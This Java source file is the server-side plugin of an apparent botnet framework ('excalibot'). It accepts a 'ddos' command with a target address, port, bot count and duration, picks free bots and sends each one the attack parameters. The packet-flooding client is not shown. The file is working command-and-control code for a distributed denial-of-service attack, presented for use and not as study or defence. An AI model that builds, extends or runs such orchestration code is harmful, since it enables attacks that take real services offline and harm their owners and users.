package org.powertrip.excalibot.common.plugins.ddos;

import org.powertrip.excalibot.common.com.*;
import org.powertrip.excalibot.common.plugins.ArthurPlug;
import org.powertrip.excalibot.common.plugins.interfaces.arthur.KnightManagerInterface;
import org.powertrip.excalibot.common.plugins.interfaces.arthur.TaskManagerInterface;
import org.powertrip.excalibot.common.utils.logging.Logger;

import java.util.List;
import java.util.Map;
import java.util.OptionalDouble;
import java.util.Random;
import java.util.stream.Collectors;

/**
 * Created by Tiago on 04/01/2016.
 * 04:11
 */

public class Server extends ArthurPlug{
	private long LimitTime=50000;

	public Server(KnightManagerInterface knightManager, TaskManagerInterface taskManager) {
		super(knightManager, taskManager);
	}

	@Override
	public PluginHelp help() {
		return new PluginHelp().setHelp("::DDOS [Distributed Denial of Service]\n" +
				"Usage: ddos address:<address> port:<Port> bots:<bots> duration:<time(seconds)>");
	}

	@Override
	public TaskResult check(Task task) {
		TaskResult result = new TaskResult();

		Long total = taskManager.getKnightCount(task.getTaskId());
		Long recev = taskManager.getResultCount(task.getTaskId());

		result
			.setSuccessful(true)
			.setTaskId(task.getTaskId())
			.setResponse("total", total.toString())
			.setResponse("done", recev.toString())
			.setComplete(total.equals(recev));
		return result;
	}

	@Override
	public TaskResult get(Task task) {
		Long total = taskManager.getKnightCount(task.getTaskId());
		Long recev = taskManager.getResultCount(task.getTaskId());

		TaskResult result = new TaskResult()
									.setTaskId(task.getTaskId())
									.setSuccessful(true)
									.setComplete(total.equals(recev));

        List<String> state = taskManager.getAllResults(task.getTaskId()).stream()
                .filter(subTaskResult -> subTaskResult.getResponseMap().containsKey("state"))
                .map(subTaskResult1 -> subTaskResult1.getResponse("state"))
                .collect(Collectors.toList());


        return result.setResponse("stdout", state.get(0));
    }

	@Override
	public void handleSubTaskResult(Task task, SubTaskResult subTaskResult) {
		/**
		 * Only if I need to do anything when I get a reply.
		 */
	}

	@Override
	public TaskResult submit(Task task) {
		//Get my parameter map, could use task.getParameter(String key), but this is shorter.
		Logger.log(task.toString());
		Map args = task.getParametersMap();

		//Declare my parameters
		String port;
		String address;
		long botCount;

		//Create a TaskResult and fill the common fields.
		TaskResult result = new TaskResult()
									.setTaskId(task.getTaskId())
									.setSuccessful(false)
									.setComplete(true);

		//No Dice! Wrong parameters.
		if( !args.containsKey("address") || !args.containsKey("bots") ) {
			return result.setResponse("stdout", "Wrong parameters");
		}
		Random r = new Random();
		if(!args.containsKey("port"))
			port = Integer.toString(r.nextInt(65535-1) + 1);
		else
			port=(String)args.get("port");

        if(args.containsKey("duration")){
			LimitTime=Long.parseLong((String) args.get("duration"))*1000;
		}
		//Parse parameters
		address = (String) args.get("address");
		botCount = Long.parseLong((String) args.get("bots"));

		try {
			//Get bots alive in the last 50 seconds and get as many as needed
			List<KnightInfo> bots = knightManager.getFreeKnightList(50000).subList(0, (int) botCount);
			for(KnightInfo bot : bots){
				knightManager.dispatchToKnight(
						new SubTask(task, bot)
								.setParameter("address", address)
								.setParameter("port",port)
								.setParameter("time",Long.toString(LimitTime))
				);
                System.out.println("Bot Dispatch");
			}
			result
				.setSuccessful(true)
				.setResponse("stdout", "Task accepted, keep an eye out for the results :D");
		}catch (IndexOutOfBoundsException e) {
			//No bots...
			result.setResponse("stdout", "Not enough free bots.");
		}
		return result;
	}
}
